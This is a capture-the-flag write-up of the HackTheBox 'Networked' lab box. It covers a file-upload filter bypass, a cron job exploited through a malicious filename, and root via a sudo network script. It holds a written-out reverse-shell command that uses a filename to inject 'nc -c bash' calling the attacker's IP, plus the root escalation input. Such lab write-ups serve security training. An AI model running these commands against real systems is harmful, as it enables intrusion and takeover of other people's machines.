---
layout: post
category: writeup
---

## Machine Info

- Name: Networked
- Description: Networked is an Easy difficulty Linux box vulnerable to file upload bypass, leading to code execution. Due to improper sanitization, a crontab running as the user can be exploited to achieve command execution. The user has privileges to execute a network configuration script, which can be leveraged to execute commands as root.
- Difficulty: Easy

## Initial Access

Nmap:
```bash
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

2 ports, should be easy enough. I access the page and get hit with this:

![](assets/images/2024-01-24-HTB-Networked-writeup-image-1.png)

So instantly I start a dirsearch:
```bash
HTB dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u http://10.10.10.146/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, html | HTTP method: GET | Threads: 64 | Wordlist size: 1102725

Output File: /home/kali/.dirsearch/reports/10.10.10.146/-_24-01-24_08-18-00.txt

Error Log: /home/kali/.dirsearch/logs/errors-24-01-24_08-18-00.log

Target: http://10.10.10.146/

[08:18:00] Starting: 
[08:18:01] 403 -  210B  - /cgi-bin/
[08:18:03] 200 -   73KB - /icons/
[08:18:04] 301 -  236B  - /uploads  ->  http://10.10.10.146/uploads/
[08:18:04] 200 -    2B  - /uploads/
[08:18:04] 200 -    1KB - /photos.php
[08:18:06] 200 -  169B  - /upload.php
[08:18:06] 200 -  229B  - /index.php
[08:18:09] 200 -    0B  - /lib.php
[08:18:16] 301 -  235B  - /backup  ->  http://10.10.10.146/backup/
[08:18:16] 200 -  885B  - /backup/
```

This shows me a lot, but the one I'm most interested in right now is backup:

![](assets/images/2024-01-24-HTB-Networked-writeup-image-2.png)

this shows a backup.tar file that I can download, I untar it and it seems like its the same files present in the webpage, photos.php, upload.php lib.php.

### Source code inspection

So photos and upload import in lib.php, so let's start with lib!

#### lib.php:

getnameCheck:
![](assets/images/2024-01-24-HTB-Networked-writeup-image-3.png)
This function takes the name of the file, and replaces the `.` with a `_` 

getnameUpload:
![](assets/images/2024-01-24-HTB-Networked-writeup-image-4.png)
This function takes the name of the file and does pretty much the exact same thing.

check_ip:
![](assets/images/2024-01-24-HTB-Networked-writeup-image-5.png)
this function takes in $prefix and a filename, and it checks if that file name has that prefix. 

file_mime_type:
![](assets/images/2024-01-24-HTB-Networked-writeup-image-6.png)

This function gets the file mime type.


check_file_type:
![](assets/images/2024-01-24-HTB-Networked-writeup-image-7.png)
this checks the mime type, needs to be an image

finally the displayform function:
![](assets/images/2024-01-24-HTB-Networked-writeup-image-8.png)
This function displays the info on the screen

#### photos.php

This file mainly just checks the file name using the check_ip above:
![](assets/images/2024-01-24-HTB-Networked-writeup-image-9.png)
and if its valid it'll display it.

#### upload.php

this file just allows us to upload a file with certain conditions:

![](assets/images/2024-01-24-HTB-Networked-writeup-image-10.png)

to start the file type needs to valid, we know that needs to have a mimetype of an image, next it needs to be larger than 60000? bytes, I'll have to double check that. 
The next thing it needs is to make sure the extension is  jpg, png, gif, or jpeg.

### Exploitation

Now that I have a basic understanding of the code, I'll start exploiting it:

To begin, I'll go ahead and send in a regular png:

![](assets/images/2024-01-24-HTB-Networked-writeup-image-11.png)

this was uploaded and we can see it on the photos.php file:

![](assets/images/2024-01-24-HTB-Networked-writeup-image-12.png)

Next I will upload the same file but with a reverse shell payload at the end, and I add a twist to the file name i use a `.php...png` extension, this should bypass the filter and make it think its a png, and it should execute the php code:
![](assets/images/2024-01-24-HTB-Networked-writeup-image-13.png)

From there I refresh the photos.php page, and check my netcat listener:

![](assets/images/2024-01-24-HTB-Networked-writeup-image-14.png)
## Privilege Escalation

I got a shell as apache, so I have to privilege escalate, so I got to guly's home directory where I find the following files:

![](assets/images/2024-01-24-HTB-Networked-writeup-image-15.png)

This says a lot, every 3 minutes a php script is ran on check_attack.php by guly. I don't have write permissions on either of these files!

But I can create files on `/var/www/html/uploads` where the value is being pulled from!. This helps so when the check is run, it'll identify my filename is a vulnerability and try to remove it, the only issue is that it is not sanitized so I can write whatever like:
```bash
touch '; nc -c bash 10.10.14.14 4444 &'
```

this will write a file that when called with rm, rm will ignore and instead perform a command injection attack!

I write the file and wait a few minutes.

Now that I am guly:
```bash
[guly@networked ~]$ sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
    LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
[guly@networked ~]$ ls -la /usr/local/sbin/changename.sh
-rwxr-xr-x 1 root root 422 Jul  8  2019 /usr/local/sbin/changename.sh
[guly@networked ~]$ cat /usr/local/sbin/changename.sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
[guly@networked ~]$
```

I can see that I can run the script as root! This script also takes in anything I enter into read. this means that I can enter arguments seperated by whitespace, so I should be able to enter any command as a second argument. 
```bash
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh 
interface NAME:
a bash
interface PROXY_METHOD:
a
interface BROWSER_ONLY:
a
interface BOOTPROTO:
a
[root@networked network-scripts]# whoami
root
[root@networked network-scripts]#
```

best,
gerbsec